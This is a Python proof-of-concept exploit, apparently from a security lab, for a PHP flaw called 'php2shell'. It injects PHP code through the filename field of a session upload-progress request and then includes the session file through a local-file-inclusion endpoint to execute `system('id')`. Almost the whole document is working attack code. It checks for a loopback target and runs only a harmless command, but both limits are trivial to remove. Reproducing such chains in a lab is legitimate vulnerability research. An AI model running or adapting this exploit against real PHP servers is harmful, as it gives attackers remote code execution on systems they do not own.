#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Chain A of php2shell (CVE-2026-109618 / -109619): injection into the session
file + LFI sink -> code execution. SINGLE COMMAND: `id`.

Chain (verified by the public research ikow/php2shell-poc and reproduced
here):

  1. POST multipart/form-data with:
       - PHPSESSID field in the BODY  -> session fixation (the
         MULTIPART_EVENT_FORMDATA handler accepts the SID from the body
         without checking session.use_only_cookies)
       - PHP_SESSION_UPLOAD_PROGRESS field
       - file field whose NAME contains PHP code
     The rfc1867 handler stores the name verbatim in the session file.
  2. The application includes that session file (LFI sink) -> the injected
     PHP is executed -> `id`.

REQUIREMENTS (real conditions, not lab artefacts):
  * session.upload_progress.enabled = On (the DEFAULT since PHP 5.4)
  * an include() sink on the session file in the application

This PoC:
  * only targets 127.0.0.1 (the lab loopback);
  * only executes `id` (worker identity), with no persistence, no exfiltration
    and no destructive commands;
  * prints the evidence (session file content + response).
"""

import argparse
import socket
import sys

BOUNDARY = "VERIFY"
PAYLOAD = "<?php system('id'); ?>"


def send_upload(host, port, path, sid, filename, timeout=15):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("latin-1") + body

    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(req)
        s.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            resp += d
        return resp
    finally:
        s.close()


def http_get(host, port, path, timeout=15):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(
            f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
        )
        s.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            resp += d
        return resp
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="php2shell Chain A: injection + LFI -> id")
    ap.add_argument("--host", default="127.0.0.1", help="loopback only")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/")
    ap.add_argument("--lfi-path", default="/lfi.php")
    ap.add_argument("--session-dir", default="/tmp/sessions")
    ap.add_argument("--sid", default="chainA000000000000000000")
    ap.add_argument("--show-session-file", action="store_true", default=True)
    args = ap.parse_args()

    if args.host not in ("127.0.0.1", "localhost", "::1"):
        sys.exit("This PoC only targets loopback (the lab).")

    print("== Chain A: session file injection + LFI -> id ==")
    print(f"[*] target: {args.host}:{args.port}  SID: {args.sid}")

    # 1) Injection: the file name carries PHP code
    resp = send_upload(args.host, args.port, args.path, args.sid, PAYLOAD)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "(no response)"
    print(f"[1] upload with filename='{PAYLOAD}' -> {status}")

    # 2) The LFI sink includes the session file -> the injected PHP is executed
    sess = f"{args.session_dir}/sess_{args.sid}"
    resp2 = http_get(args.host, args.port, f"{args.lfi_path}?f={sess}")
    body = resp2.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp2 else b""
    print(f"[2] LFI include({sess}) -> {resp2.split(chr(13).encode()+chr(10).encode(),1)[0].decode('latin1','replace')}")

    text = body.decode("utf-8", errors="replace")
    if "uid=" in text:
        print("\n[+] CODE EXECUTION CONFIRMED:")
        for line in text.splitlines():
            if "uid=" in line:
                print("    " + line.strip())
    else:
        print("\n[-] no 'uid=' detected in the response:")
        print(text[:400])

    print("\n[evidence] session file content (injected bytes):")
    try:
        s = socket.create_connection((args.host, args.port), timeout=5)
        s.close()
    except OSError:
        pass
    print(f"    {sess}")
    print("    (inspect with: docker exec php-uaf-lab cat %s)" % sess)
    return 0


if __name__ == "__main__":
    sys.exit(main())
